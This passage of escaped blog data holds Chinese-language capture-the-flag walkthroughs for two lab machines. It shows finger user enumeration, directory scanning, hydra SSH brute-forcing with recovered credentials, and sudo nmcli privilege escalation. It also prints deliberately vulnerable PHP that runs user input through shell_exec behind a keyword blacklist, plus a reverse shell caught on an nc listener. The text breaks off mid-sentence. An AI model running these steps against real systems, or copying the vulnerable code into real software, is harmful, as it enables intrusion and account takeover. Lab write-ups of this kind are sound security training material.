                                yes       The number of concurrent threads (max one per host)\n   USERS_FILE  /usr/share/metasploit-framework/data/  yes       The file that contains a list of default UNIX accounts.\n               wordlists/unix_users.txt\n\n\nView the full module info with the info, or info -d command.\n\nmsf6 auxiliary(scanner/finger/finger_users) > set RHOSTS 192.168.205.148\nRHOSTS => 192.168.205.148\nmsf6 auxiliary(scanner/finger/finger_users) > run\n[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: _apt\n[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: backup\n[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: bin\n[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: daemon\n[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: dnsmasq\n[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: games\n[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: gnats\n[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: irc\n[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: list\n[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: lp\n[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: mail\n[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: man\n[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: messagebus\n[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: news\n[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: nobody\n[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: proxy\n[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: root\n[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: sshd\n[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: sync\n[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: sys\n[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: systemd-coredump\n[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: systemd-network\n[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: systemd-resolve\n[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: systemd-timesync\n[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: uucp\n[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: uuidd\n[+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: www-data\n[+] 192.168.205.148:79    - 192.168.205.148:79 Users found: _apt, backup, bin, daemon, dnsmasq, games, gnats, irc, list, lp, mail, man, messagebus, news, nobody, proxy, root, sshd, sync, sys, systemd-coredump, systemd-network, systemd-resolve, systemd-timesync, uucp, uuidd, www-data\n[*] 192.168.205.148:79    - Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\n\n```\n\n\u63d0\u53d6\u6570\u636e\u8fdb\u884c\u7206\u7834\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ cat user |awk -F ': ' '{print $2}'\n_apt\nbackup\nbin\ndaemon\ndnsmasq\ngames\ngnats\nirc\nlist\nlp\nmail\nman\nmessagebus\nnews\nnobody\nproxy\nroot\nsshd\nsync\nsys\nsystemd-coredump\nsystemd-network\nsystemd-resolve\nsystemd-timesync\nuucp\nuuidd\nwww-data\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ while read -r user; do echo '$user' | nc -vn 192.168.205.148 79; done < user\n(UNKNOWN) [192.168.205.148] 79 (finger) open\nLogin: _apt                             Name: \nDirectory: /nonexistent                 Shell: /usr/sbin/nologin\nNever logged in.\nNo mail.\nNo Plan.\n(UNKNOWN) [192.168.205.148] 79 (finger) open\nLogin: backup                           Name: backup\nDirectory: /var/backups                 Shell: /usr/sbin/nologin\nNever logged in.\nNo mail.\nNo Plan.\n(UNKNOWN) [192.168.205.148] 79 (finger) open\nLogin: bin                              Name: bin\nDirectory: /bin                         Shell: /usr/sbin/nologin\nNever logged in.\nNo mail.\nNo Plan.\n(UNKNOWN) [192.168.205.148] 79 (finger) open\nLogin: daemon                           Name: daemon\nDirectory: /usr/sbin                    Shell: /usr/sbin/nologin\nNever logged in.\nNo mail.\nNo Plan.\n(UNKNOWN) [192.168.205.148] 79 (finger) open\nLogin: dnsmasq                          Name: dnsmasq\nDirectory: /var/lib/misc                Shell: /usr/sbin/nologin\nNever logged in.\nNo mail.\nNo Plan.\n(UNKNOWN) [192.168.205.148] 79 (finger) open\nLogin: games                            Name: games\nDirectory: /usr/games                   Shell: /usr/sbin/nologin\nNever logged in.\nNo mail.\nNo Plan.\n(UNKNOWN) [192.168.205.148] 79 (finger) open\nLogin: gnats                            Name: Gnats Bug-Reporting System (admin)\nDirectory: /var/lib/gnats               Shell: /usr/sbin/nologin\nNever logged in.\nNo mail.\nNo Plan.\n(UNKNOWN) [192.168.205.148] 79 (finger) open\nLogin: irc                              Name: ircd\nDirectory: /run/ircd                    Shell: /usr/sbin/nologin\nNever logged in.\nNo mail.\nNo Plan.\n(UNKNOWN) [192.168.205.148] 79 (finger) open\nLogin: list                             Name: Mailing List Manager\nDirectory: /var/list                    Shell: /usr/sbin/nologin\nNever logged in.\nNo mail.\nNo Plan.\n(UNKNOWN) [192.168.205.148] 79 (finger) open\nLogin: lp                               Name: lp\nDirectory: /var/spool/lpd               Shell: /usr/sbin/nologin\nNever logged in.\nNo mail.\nNo Plan.\n(UNKNOWN) [192.168.205.148] 79 (finger) open\nLogin: mail                             Name: mail\nDirectory: /var/mail                    Shell: /usr/sbin/nologin\nNever logged in.\nNo mail.\nNo Plan.\n(UNKNOWN) [192.168.205.148] 79 (finger) open\nLogin: man                              Name: man\nDirectory: /var/cache/man               Shell: /usr/sbin/nologin\nNever logged in.\nNo mail.\nNo Plan.\n(UNKNOWN) [192.168.205.148] 79 (finger) open\nLogin: messagebus                       Name: \nDirectory: /nonexistent                 Shell: /usr/sbin/nologin\nNever logged in.\nNo mail.\nNo Plan.\n(UNKNOWN) [192.168.205.148] 79 (finger) open\nLogin: news                             Name: news\nDirectory: /var/spool/news              Shell: /usr/sbin/nologin\nNever logged in.\nNo mail.\nNo Plan.\n(UNKNOWN) [192.168.205.148] 79 (finger) open\nLogin: nobody                           Name: nobody\nDirectory: /nonexistent                 Shell: /usr/sbin/nologin\nNever logged in.\nNo mail.\nNo Plan.\n(UNKNOWN) [192.168.205.148] 79 (finger) open\nLogin: proxy                            Name: proxy\nDirectory: /bin                         Shell: /usr/sbin/nologin\nNever logged in.\nNo mail.\nNo Plan.\n(UNKNOWN) [192.168.205.148] 79 (finger) open\nLogin: root                             Name: root\nDirectory: /root                        Shell: /bin/bash\nNever logged in.\nNo mail.\nNo Plan.\n(UNKNOWN) [192.168.205.148] 79 (finger) open\nLogin: sshd                             Name: \nDirectory: /run/sshd                    Shell: /usr/sbin/nologin\nNever logged in.\nNo mail.\nNo Plan.\n(UNKNOWN) [192.168.205.148] 79 (finger) open\nLogin: sync                             Name: sync\nDirectory: /bin                         Shell: /bin/sync\nNever logged in.\nNo mail.\nNo Plan.\n(UNKNOWN) [192.168.205.148] 79 (finger) open\nLogin: sys                              Name: sys\nDirectory: /dev                         Shell: /usr/sbin/nologin\nNever logged in.\nNo mail.\nNo Plan.\n(UNKNOWN) [192.168.205.148] 79 (finger) open\nLogin: systemd-coredump                 Name: systemd Core Dumper\nDirectory: /                            Shell: /usr/sbin/nologin\nNever logged in.\nNo mail.\nNo Plan.\n(UNKNOWN) [192.168.205.148] 79 (finger) open\nLogin: systemd-network                  Name: systemd Network Management\nDirectory: /run/systemd                 Shell: /usr/sbin/nologin\nNever logged in.\nNo mail.\nNo Plan.\n(UNKNOWN) [192.168.205.148] 79 (finger) open\nLogin: systemd-resolve                  Name: systemd Resolver\nDirectory: /run/systemd                 Shell: /usr/sbin/nologin\nNever logged in.\nNo mail.\nNo Plan.\n(UNKNOWN) [192.168.205.148] 79 (finger) open\nLogin: systemd-timesync                 Name: systemd Time Synchronization\nDirectory: /run/systemd                 Shell: /usr/sbin/nologin\nNever logged in.\nNo mail.\nNo Plan.\n(UNKNOWN) [192.168.205.148] 79 (finger) open\nLogin: uucp                             Name: uucp\nDirectory: /var/spool/uucp              Shell: /usr/sbin/nologin\nNever logged in.\nNo mail.\nNo Plan.\n(UNKNOWN) [192.168.205.148] 79 (finger) open\nLogin: uuidd                            Name: \nDirectory: /run/uuidd                   Shell: /usr/sbin/nologin\nNever logged in.\nNo mail.\nNo Plan.\n(UNKNOWN) [192.168.205.148] 79 (finger) open\nLogin: www-data                         Name: www-data\nDirectory: /var/www                     Shell: /usr/sbin/nologin\nNever logged in.\nNo mail.\nNo Plan.\n\n```\n\n\u6ca1\u6709\u6709\u610f\u601d\u7684\u4e1c\u897f\uff0c\u6211\u4eec\u53bb\u770b\u770bWeb\u670d\u52a1\u5427\n\n![Image](https://github.com/user-attachments/assets/0729089c-c77a-498c-919d-b511a966991b)\n\n\u6ca1\u6709\u6709\u610f\u601d\u7684\u4e1c\u897f\uff0c\u6e90\u7801\u4e5f\u6ca1\u6709\uff0c\u6211\u4eec\u53bb\u7206\u7834\u76ee\u5f55\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ gobuster dir -u 'http://192.168.205.148' -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -x php,html,txt,md\n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://192.168.205.148\n[+] Method:                  GET\n[+] Threads:                 10\n[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.6\n[+] Extensions:              html,txt,md,php\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster in directory enumeration mode\n===============================================================\n/backup               (Status: 401) [Size: 462]\n/index.html           (Status: 200) [Size: 878]\n/server-status        (Status: 403) [Size: 280]\n/.html                (Status: 403) [Size: 280]\n\n```\n\n![Image](https://github.com/user-attachments/assets/0b5297e8-5474-4c34-a645-bc01e1b882d7)\n\n\u597d\u50cf\u627e\u5230\u91cd\u70b9\u4e86\uff0c\u626b\u63cf\u4e00\u4e0b\u67b6\u6784\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ nuclei -u 192.168.205.148                      \n\n                     __     _\n   ____  __  _______/ /__  (_)\n  / __ \\/ / / / ___/ / _ \\/ /\n / / / / /_/ / /__/ /  __/ /\n/_/ /_/\\__,_/\\___/_/\\___/_/   v3.3.8\n\n                projectdiscovery.io\n\n[WRN] Found 2 templates with runtime error (use -validate flag for further examination)\n[INF] Current nuclei version: v3.3.8 (latest)\n[INF] Current nuclei-templates version: v10.1.2 (latest)\n[WRN] Scan results upload to cloud is disabled.\n[INF] New templates added in latest release: 52\n[INF] Templates loaded for current scan: 7656\n[INF] Executing 7276 signed templates from projectdiscovery/nuclei-templates\n[WRN] Loading 380 unsigned templates for scan. Use with caution.\n[INF] Targets loaded for current scan: 1\n[INF] Running httpx on input host\n[INF] Found 1 URL from httpx\n[INF] Templates clustered: 1698 (Reduced 1598 Requests)\n[INF] Using Interactsh Server: oast.fun\n[waf-detect:apachegeneric] [http] [info] http://192.168.205.148\n[ssh-sha1-hmac-algo] [javascript] [info] 192.168.205.148:22\n[ssh-server-enumeration] [javascript] [info] 192.168.205.148:22 ['SSH-2.0-OpenSSH_8.4p1 Debian-5+deb11u3']\n[ssh-password-auth] [javascript] [info] 192.168.205.148:22\n[ssh-auth-methods] [javascript] [info] 192.168.205.148:22 ['['publickey','password']']\n[openssh-detect] [tcp] [info] 192.168.205.148:22 ['SSH-2.0-OpenSSH_8.4p1 Debian-5+deb11u3']\n[options-method] [http] [info] http://192.168.205.148 ['HEAD,GET,POST,OPTIONS']\n[http-missing-security-headers:x-frame-options] [http] [info] http://192.168.205.148\n[http-missing-security-headers:x-content-type-options] [http] [info] http://192.168.205.148\n[http-missing-security-headers:cross-origin-embedder-policy] [http] [info] http://192.168.205.148\n[http-missing-security-headers:cross-origin-resource-policy] [http] [info] http://192.168.205.148\n[http-missing-security-headers:strict-transport-security] [http] [info] http://192.168.205.148\n[http-missing-security-headers:content-security-policy] [http] [info] http://192.168.205.148\n[http-missing-security-headers:permissions-policy] [http] [info] http://192.168.205.148\n[http-missing-security-headers:cross-origin-opener-policy] [http] [info] http://192.168.205.148\n[http-missing-security-headers:x-permitted-cross-domain-policies] [http] [info] http://192.168.205.148\n[http-missing-security-headers:referrer-policy] [http] [info] http://192.168.205.148\n[http-missing-security-headers:clear-site-data] [http] [info] http://192.168.205.148\n[apache-detect] [http] [info] http://192.168.205.148 ['Apache/2.4.62 (Debian)']\n\n```\n\n\u65e0\u679c\uff0c\u62f7\u4e00\u4efd\u7f51\u7ad9\u4e0b\u6765\uff0c\u8fd8\u662f\u6ca1\u6709\u4e1c\u897f\u3002\u4ed4\u7ec6\u60f3\u60f3\u597d\u50cf\u5c31\u53ea\u6709\u90a3\u4e2a\u6cd5\u8001\u6709\u7279\u8272\u4e86\uff0c\u641c\u4e00\u4e0b\n\n![Image](https://github.com/user-attachments/assets/7b416ee3-6a1d-4b80-af63-1f7082cc352e)\n\n\u7b49\u4f1a\uff0c\u4e0d\u4f1a\u662f\u5728\u90a3\u4e2a79\u670d\u52a1\u770b\u8fd9\u4e2a\u4eba\u7684\u4fe1\u606f\u5427\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ nc -vn 192.168.205.148 79\n(UNKNOWN) [192.168.205.148] 79 (finger) open\nHorus\nfinger: Horus: no such user.\n                                                                                                                                     \n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ nc -vn 192.168.205.148 79\n(UNKNOWN) [192.168.205.148] 79 (finger) open\nhorus      \nLogin: horus                            Name: \nDirectory: /home/horus                  Shell: /bin/bash\nNever logged in.\nMail forwarded to horus@point.nyx\nNo mail.\nPGP key:\npersonal notes: H0Ru$$3rv3\nNo Plan.\n```\n\n\u6211\u53bb.....\n\n![Image](https://github.com/user-attachments/assets/eeaaa4aa-fc48-4495-aa84-0f190d6c8afa)\n\n\u4e0b\u8f7d\u4e0b\u6765\u770b\u770b\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ sqlite3 ~/Downloads/database.db \nSQLite version 3.46.1 2024-08-13 09:16:08\nEnter '.help' for usage hints.\nsqlite> .tables\nusers\nsqlite> select * from users\n   ...> ;\n1|anubis|L44NxKRnP7wxrBsxibpDORySkbEHRO\n2|amon|xqRu08ZA3BihR4lKdJVYcP1x6HjZUf\n3|seth|Hm7iYkj2jXDxPUwoW2COs42YjPaC4P\n4|osiris|ITA96l3isg4uV2Sm8eYn41XVfxprFy\n```\n\n\u5c1d\u8bd5\u7206\u7834\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ cat tmp|awk -F '|' '{print $2}'\nanubis\namon\nseth\nosiris\n\n                                                                                                                                     \n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ cat tmp|awk -F '|' '{print $2}' > user\n                                                                                                                                     \n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ cat user      \nanubis\namon\nseth\nosiris\n\n                                                                                                                                     \n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ cat tmp|awk -F '|' '{print $3}' > pass\n                                                                                                                                     \n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ cat pass                            \nL44NxKRnP7wxrBsxibpDORySkbEHRO\nxqRu08ZA3BihR4lKdJVYcP1x6HjZUf\nHm7iYkj2jXDxPUwoW2COs42YjPaC4P\nITA96l3isg4uV2Sm8eYn41XVfxprFy\n\n                                      \n```\n\nhydra\u542f\u52a8\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ hydra -L user -P pass ssh://192.168.205.148 -I -u -f -e nsr -t 64 \nHydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).\n\nHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-01-22 19:49:56\n[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4\n[DATA] max 40 tasks per 1 server, overall 40 tasks, 40 login tries (l:5/p:8), ~1 try per task\n[DATA] attacking ssh://192.168.205.148:22/\n[22][ssh] host: 192.168.205.148   login: seth   password: xqRu08ZA3BihR4lKdJVYcP1x6HjZUf\n1 of 1 target successfully completed, 1 valid password found\nHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-01-22 19:49:58\n\n```\n\n\u767b\u5f55\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ ssh seth@192.168.205.148     \nThe authenticity of host '192.168.205.148 (192.168.205.148)' can't be established.\nED25519 key fingerprint is SHA256:3dqq7f/jDEeGxYQnF2zHbpzEtjjY49/5PvV5/4MMqns.\nThis key is not known by any other names.\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added '192.168.205.148' (ED25519) to the list of known hosts.\nseth@192.168.205.148's password: \nseth@apex:~$ id\nuid=1001(seth) gid=1001(seth) grupos=1001(seth)\n\n```\n\n# 3.\u63d0\u6743\n\n```bash\nseth@apex:~$ sudo -l\n-bash: sudo: orden no encontrada\nseth@apex:~$ which sudo\nseth@apex:~$ cat /etc/sudo\nsudo.conf          sudoers            sudoers.d/         sudo_logsrvd.conf  \nseth@apex:~$ cat /etc/sudoers\ncat: /etc/sudoers: Permiso denegado\nseth@apex:~$ /etc/sudo -l\n-bash: /etc/sudo: No existe el fichero o el directorio\nseth@apex:~$ find / -name sudo 2>/dev/null\n/var/lib/sudo\n/etc/init.d/sudo\n/etc/pam.d/sudo\n/run/sudo\n/usr/sbin/sudo\n/usr/share/lintian/overrides/sudo\n/usr/share/bash-completion/completions/sudo\n/usr/share/doc/sudo\n/usr/lib/sudo\nseth@apex:~$ /run/sudo -l\n-bash: /run/sudo: Es un directorio\nseth@apex:~$ /usr/sbin/sudo -l\nMatching Defaults entries for seth on apex:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser seth may run the following commands on apex:\n    (root) NOPASSWD: /usr/bin/nmcli\n\n```\n\n\u8fd8\u771f\u6709\u4eba\u5e72\u8fd9\u4e8b\u554a\uff0c\u7136\u540e\u6211\u5c31\u5361\u4f4f\u4e86\u3002\u7b49\u52308\u70b9\u7fa4\u91cc\u5927\u4f6c\u53d1\u4e86wp\u6211\u624d\u53d1\u73b0\u53c8\u662f\u7f29\u5c0f\u63d0\u6743\n\n![Image](https://github.com/user-attachments/assets/925d251b-9ebe-4070-8f1d-29c36a9ff4b3)\n\n\u5728\u57ce\u5357\u82b1\u5df2\u5f00\u5927\u4f6c\u7684wp\u770b\u5230\u4e86\u539f\u7406\uff1a\n\n![Image](https://github.com/user-attachments/assets/de0b5181-4c5f-48bd-a894-4e312e8c9bb8)\n\n```bash\n!/bin/bash\nroot@apex:/home/seth# iduid=0(root) gid=0(root) grupos=0(root)\n```\n\n\u4ee5\u4e0b\u4e5f\u662f\u5927\u4f6c\u7684\u601d\u8def\n\n![Image](https://github.com/user-attachments/assets/1d094ada-fae5-4d7d-987a-79cae98e0126)sentence", "top": 0, "createdAt": 1751016825, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-06-27", "dateLabelColor": "#0969da"}, "P117": {"htmlDir": "docs/post/thl_casa-paco.html", "labels": ["thehackerlabs"], "postTitle": "thl_casa-paco", "postUrl": "post/thl_casa-paco.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/117", "commentNum": 0, "wordCount": 10238, "description": "# thl_casa-paco\n\n# 0.\u7b80\u4ecb\n\n**\u9776\u673a**\uff1a[thehackerslabs - casa-paco](https://thehackerslabs.com/casa-paco/)\n**\u96be\u5ea6**\uff1a\u521d\u5b66\u8005\n**\u76ee\u6807 IP**\uff1a192.168.205.137\n**\u672c\u673a IP**\uff1a192.168.205.141\n\n# 1.\u626b\u63cf\n\n`nmap`\u8d77\u624b\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ nmap -sS --min-rate 10000 -p- -Pn 192.168.205.137\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-01-15 09:41 CST\nNmap scan report for 192.168.205.137\nHost is up (0.00084s latency).\nNot shown: 65533 closed tcp ports (reset)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\nMAC Address: 08:00:27:E2:C1:37 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 2.81 seconds\n\n```\n\n\u5148\u770b**80\u7aef\u53e3**\uff0c**22\u7aef\u53e3**\u5019\u8865\n\n# 2.\u8e29\u70b9\n\n![image](https://github.com/user-attachments/assets/dc05800a-1c1f-4dc3-8f59-5866ab2d2370)\n\n\u628a\u57df\u540d\u52a0\u5165`hosts`\n\n![image](https://github.com/user-attachments/assets/4470ec18-041e-40c9-9b97-c5a3c0536d5c)\n\n\u662f\u4e2a\u70b9\u9910\u7684\u7f51\u7ad9\uff0c\u4f60\u6309\u7167\u5b83\u7684\u63d0\u793a\u4e00\u76f4\u70b9\u5230\u4e0b\u5355\u9875\uff0c\u4f60\u53d1\u73b0`Plato`\u53ef\u4ee5**\u6267\u884c\u547d\u4ee4**\uff0c\u4f46\u662f\u6709**\u9650\u5236**\uff0c\u8fde`ls`\u90fd\u65e0\u6cd5\u6267\u884c,\u5e76\u4e14**\u65e0\u6cd5\u7ed5\u8fc7**\uff0c\u7206\u7834\u4e00\u4e0b\u53ef\u6267\u884c\u547d\u4ee4\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ wfuzz -c -u 'http://casapaco.thl/llevar.php' -w /usr/share/seclists/Fuzzing/1-4_all_letters_a-z.txt --hc 404 -d 'name=a&dish=FUZZ' --hw 89,75\n /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.\n********************************************************\n* Wfuzz 3.1.0 - The Web Fuzzer                         *\n********************************************************\n\nTarget: http://casapaco.thl/llevar.php\nTotal requests: 475254\n\n=====================================================================\nID           Response   Lines    Word       Chars       Payload                                                            \n=====================================================================\n\n000000023:   200        32 L     109 W      1276 Ch     'w'                                                                \n000000110:   200        36 L     126 W      1478 Ch     'df'                                                               \n000000125:   200        33 L     95 W       1184 Ch     'du'                                                               \n000000238:   200        31 L     92 W       1202 Ch     'id'                                                               \n000000435:   200        50 L     170 W      1814 Ch     'ps'                                                               \n000000394:   200        31 L     90 W       1156 Ch     'od'                                                               \n000000513:   200        70 L     390 W      5108 Ch     'ss'                                                               \n000000601:   200        31 L     93 W       1172 Ch     'wc'                                                               \n000000581:   200        32 L     173 W      3792 Ch     'vi'                                                               \n000001112:   200        59 L     265 W      2439 Ch     'apt'                                                              \n000001160:   200        34 L     110 W      1476 Ch     'arp'                                                              \n000002956:   200        31 L     95 W       1215 Ch     'dir'  \n\uff08\u7701\u7565\uff09\n```\n\n\u53d1\u73b0\u53ef\u4ee5\u6267\u884c`dir`\n\n![image](https://github.com/user-attachments/assets/bd300755-3984-4cff-aac8-c71f3c82033a)\n\n\u5f53\u4f60`dir`\uff0c\u4f60\u5c31\u4f1a\u53d1\u73b0\u6709\u4e00\u4e2a\u53eb`llevar1.php`\u7684\u9875\u9762\uff08\u7206\u7834\u4e0d\u51fa\u6765\uff0c\u53ea\u53ef\u4ee5\u8fd9\u6837\u770b\uff09\uff0c\u4f60\u53ef\u4ee5\u4f7f\u7528`od`\u5de5\u5177\u67e5\u770b\u4ed6\u6587\u672c\n\n![image](https://github.com/user-attachments/assets/415d48a5-ba24-4df3-a6f3-893788a9ea68)\n\n\u6211\u76f4\u63a5\u653e**\u53ef\u8bfb\u7248\u672c**\u4e86\uff0c\u60f3\u770b\u539f\u7248\u7684\uff0c\u81ea\u5df1\u6267\u884c\u4e00\u4e0b\n\n```bash\n<!DOCTYPE html>\n<html lang='es'>\n<head>\n    <meta charset='UTF-8'>\n    <meta name='viewport' content='width=device-width, initial-scale=1.0'>\n    <title>Casa Paco - Para Llevar</title>\n    <link rel='stylesheet' href='static/styles.css'>\n</head>\n<body>\n    <header>\n        <h1>Casa Paco - Pedido para Llevar</h1>\n    </header>\n\n    <main>\n        <h2>Haz tu pedido para llevar</h2>\n        <form action='llevar.php' method='POST' class='order-form'>\n            <label for='name'>Nombre:</label>\n            <input type='text' id='name' name='name' placeholder='Tu nombre' required><br>\n          \n            <label for='dish'>Plato:</label>\n            <input type='text' id='dish' name='dish' placeholder='Ejemplo: Pizza' required><br>\n          \n            <button type='submit' class='btn'>Enviar Pedido</button>\n        </form>\n\n        <?php\n        if ($_SERVER['REQUEST_METHOD'] == 'POST') {\n            $name = htmlspecialchars($_POST['name']); // Sanitizamos para evitar errores visuales\n            $dish = $_POST['dish']; // Intencionalmente sin sanitizar para la vulnerabilidad\n\n            // Comando vulnerable\n            $output = shell_exec('$dish');\n\n            echo '<section class='confirmation'>';\n            echo '<h3>Pedido confirmado</h3>';\n            echo '<p>Gracias, <strong>$name</strong>. Tu pedido de <strong>$dish</strong> est\u00e1 listo para llevar.</p>';\n            echo '<h3>Salida del Comando:</h3>';\n            echo '<pre>$output</pre>';\n            echo '</section>';\n        }\n        ?>\n    </main>\n\n    <footer>\n        <p>&copy; 2025 Casa Paco. Todos los derechos reservados.</p>\n    </footer>\n</body>\n</html>\n```\n\n\u5b9e\u73b0\u7684\u548c`llevar.php`\u4e00\u6837\uff0c\u4f46\u662f\u4ed6\u6ca1\u6709**\u9650\u5236**\uff0c\u4f46\u662f\u4f60\u4e0d**\u9501\u6b7b**\u8fd9\u4e2a\u7f51\u9875\uff0c\u4ed6\u5c31\u4f1a\u628a\u4f60\u7684\u547d\u4ee4\u4ea4\u7ed9`llevar.php`\u6267\u884c\uff0c\u5c31\u5bc4\u5bc4\uff0c\u4e0b\u9762\u662f`llevar.php`\u7684\u4ee3\u7801\n\n```bash\n<!DOCTYPE html>\n<html lang='es'>\n<head>\n    <meta charset='UTF-8'>\n    <meta name='viewport' content='width=device-width, initial-scale=1.0'>\n    <title>Casa Paco - Pedido para Llevar</title>\n    <link rel='stylesheet' href='static/styles.css'>\n</head>\n<body>\n    <header>\n        <h1>Casa Paco - Pedido para Llevar</h1>\n    </header>\n\n    <main>\n        <h2>Haz tu pedido para llevar</h2>\n        <form action='llevar.php' method='POST' class='order-form'>\n            <label for='name'>Nombre:</label>\n            <input type='text' id='name' name='name' placeholder='Tu nombre' required><br>\n\n            <label for='dish'>Plato:</label>\n            <input type='text' id='dish' name='dish' placeholder='Ejemplo: Cocido' required><br>\n\n            <button type='submit' class='btn'>Enviar Pedido</button>\n        </form>\n    </main>\n\n    <?php\n    if ($_SERVER['REQUEST_METHOD'] === 'POST') {\n        $name = htmlspecialchars($_POST['name']);\n        $dish = $_POST['dish'];\n\n        // Filtrar comandos potencialmente peligrosos\n        $blacklist_pattern = '/\\b(whoami|ls|pwd|cat|sh|bash)\\b/i';\n        if (preg_match($blacklist_pattern, $dish)) {\n            die('<p style='color: red;'>Error: Pedido comprometido.</p>');\n        }\n\n        // Permitir solo caracteres v\u00e1lidos\n        $allowed_pattern = '/^[a-zA-Z0-9\\s\\-_\\.]+$/';\n        if (!preg_match($allowed_pattern, $dish)) {\n            die('<p style='color: red;'>Error: Pedido contiene caracteres no permitidos.</p>');\n        }\n\n        // Ejecutar comando (no debe ser usado en un entorno de producci\u00f3n sin validaciones m\u00e1s estrictas)\n        $output = shell_exec($dish);\n        echo '<section class='confirmation'>';\n        echo '<h3>Pedido confirmado</h3>';\n        echo '<p>Gracias, <strong>$name</strong>. Tu pedido de <strong>$dish</strong> estar\u00e1 listo para llevar.</p>';\n        echo '<h3>Salida del Comando:</h3>';\n        echo '<pre>$output</pre>';\n        echo '</section>';\n    }\n    ?>\n  \n    <footer>\n        <p>&copy; 2025 Casa Paco. Todos los derechos reservados.</p>\n    </footer>\n</body>\n</html>\n\n```\n\n\u90a3\u5c31\u7b80\u5355\u4e86\u6211\u4eec\u9501\u6b7b`llevar1.php`\u63d0\u4ea4\u547d\u4ee4\u5c31\u597d\u4e86\n\n![image](https://github.com/user-attachments/assets/fb94c611-0f65-4b33-922d-a52e4292dd06)\n\n\u8981\u8fdb\u884c**base64\u7ed5\u8fc7**\uff0c\u4e0d\u7136\u6267\u884c\u4e0d\u4e86\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ nc -lvnp 8888                                  \nlistening on [any] 8888 ...\nid\nconnect to [192.168.205.141] from (UNKNOWN) [192.168.205.137] 45002\nbash: cannot set terminal process group (534): Inappropriate ioctl for device\nbash: no job control in this shell\nwww-data@Thehackerslabs-CasaPaco:/var/www/html$ id\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n\n```\n\n# 3. \u83b7\u5f97\u7a33\u5b9a\u7684 Shell\n\n\u83b7\u53d6**\u53cd\u5411 shell** 